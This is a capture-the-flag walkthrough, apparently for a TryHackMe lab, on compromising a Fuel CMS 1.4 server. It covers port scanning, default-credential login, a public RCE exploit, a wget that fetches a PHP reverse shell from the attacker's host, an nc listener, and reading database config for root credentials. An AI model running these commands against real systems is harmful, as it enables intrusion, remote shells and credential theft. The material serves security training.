As always let's check what open ports the target machine has.

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/ignite/nmap.png)

Based on the nmap result we can see that there is open port 80 with CMS (Content Management System) running on it. In addition we can notice that the CMS is Fuel CMS, also we can see that there is one disallowed entry in the robots.txt. Let's scan the web service for any hidden directories.

```
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

While we are waiting for the result from gobuster we can visit the web page and look through it.

![website](/assets/images/thm/ignite/website.png)

There we can see the Fuel CMS version, it's 1.4. At the end of the page we can find endpoint to the admin panel as well as the default credentials.

![creds](/assets/images/thm/ignite/creds.png)

Navigate to this endpoint.

![login-page](/assets/images/thm/ignite/login-page.png)

An attempt to login with the found credentials was successful.

Looking through google for any known exploits about Fuel CMS 1.4 I found the following RCE (Remote Code Execution) exploit:<https://www.exploit-db.com/exploits/50477>

I downloaded the exploit and rename the file to `exp.py`. Execute the script by providing `-u` switch and the address to the CMS service.  

```
./exp.py -u http://10.10.220.239
```

![exp-shell](/assets/images/thm/ignite/exp-shell.png)

We are able to execute any commands in the system where the CMS service is hosted but the result from the command is really slow, so I decided to create a reverse shell. I have used the following php script for reverse shell:  <https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php>

Once you create the reverse shell script on your host, start a python server to be able to download the script on the target machine.

```
python3 -m http.server
```

Now from the tab where we have already established RCE execute the following command.
```
wget http://10.10.240.3:8000/rev.php
```

Once the script is downloaded, start listener on our host.
```
nc -lvnp 4444
```

Now execute the reverse shell
```
php -f rev.php
```

![rev-shell](/assets/images/thm/ignite/rev-shell.png)

From here we are good to find the first flag. The last thing that we need to do is to escalate our privileges to root. As always let's check whether our user has the rights to execute any commands as root. But first we need to get a normal tty, otherwise some commands may not be executed (as sudo -l)

Stabilize shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

I checked for sudo rights with `sudo -l` and I also took a look at `/etc/crontab` for any cron jobs that could be ran. None of these method was successfull, however I remembered that in the Fuel CMS home page there were some information about database.

![esc](/assets/images/thm/ignite/esc.png)

Navigate to `/var/www/html/fuel/application/config` and read the database file.
```
cat database.php
```

![db-cred](/assets/images/thm/ignite/db-cred.png)

We have found some root credentials, let's check whether we can switch to root

![root](/assets/images/thm/ignite/root.png)

Here we go. We were able to escalate our privileges to root.
